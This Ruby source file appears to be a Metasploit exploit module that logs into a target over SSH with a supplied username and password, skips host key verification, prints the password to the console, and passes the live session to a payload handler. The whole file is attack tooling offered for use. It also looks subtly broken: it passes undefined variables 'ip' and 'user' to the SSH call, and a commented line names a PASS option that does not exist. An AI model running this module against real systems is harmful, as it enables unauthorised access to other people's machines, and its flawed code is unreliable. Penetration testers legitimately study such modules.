##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'net/ssh'
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  def initialize(info = {})
     super(update_info(info,
       'Name'     => 'Login to ssh with username/password',
       'Description' => %q{
          Login using SSH username and password
       },
       'Author'   => [ 
         'alhazred',
         'rageltman <rageltman [at] sempervictus>'
       ],  
       'License'  => MSF_LICENSE,
       'Privileged'  => false,
       'Payload'  => {
         'DisableNops' => true,
         'Space'   => 1024,
         'Compat'  => {
           'PayloadType' => 'ssh',
           'ConnectionType' => 'tunnel',
         }
       },
       'Platform'    => [ 'windows','linux', 'osx', 'bsd', 'solaris' ],
       'Arch'     => ARCH_SSH,
       'Targets'  => [[ 'Automatic', { }]],
       'DefaultTarget' => 0))
   
     register_options(
       [
         Opt::RPORT(22),
         Opt::RHOST,
         OptString.new('USER', [ true, "The username to use" ]),
         OptString.new('PASSWORD', [ true, "The password to use"]),
      ], self.class)
  end

  def exploit
    print_status("Connecting to #{datastore['USER']}@#{datastore['RHOST']}:#{datastore['RPORT']} with password #{datastore['PASSWORD']}")
    factory = ssh_socket_factory
    opt_hash = {
      :auth_methods => ['password', 'keyboard-interactive'],
      :port   => datastore['RPORT'],
      :use_agent    => false,
      :config    => false,
      :password  => datastore['PASSWORD'],
      :proxy     => factory,
      :non_interactive => true,
      :verify_host_key => :never
    }

    opt_hash[:verbose] = :debug if datastore['SSH_DEBUG']

    begin
      conn = Net::SSH.start(ip, user, opt_hash)
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Disconnected during negotiation')
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Disconnected, 'Timed out during negotiation')
    rescue Net::SSH::AuthenticationFailed
     fail_with(Failure::NoAccess, 'Failed authentication')
    rescue Net::SSH::Exception => e
     fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
    end

    fail_with(Failure::Unknown, 'Failed to start SSH socket') unless conn

 # conn=Net::SSH.start(datastore['RHOST'],datastore['USER'],:password=>datastore['PASS'],:port=>datastore['RPORT'],:paranoid=>false)
    handler(conn)
  end

end
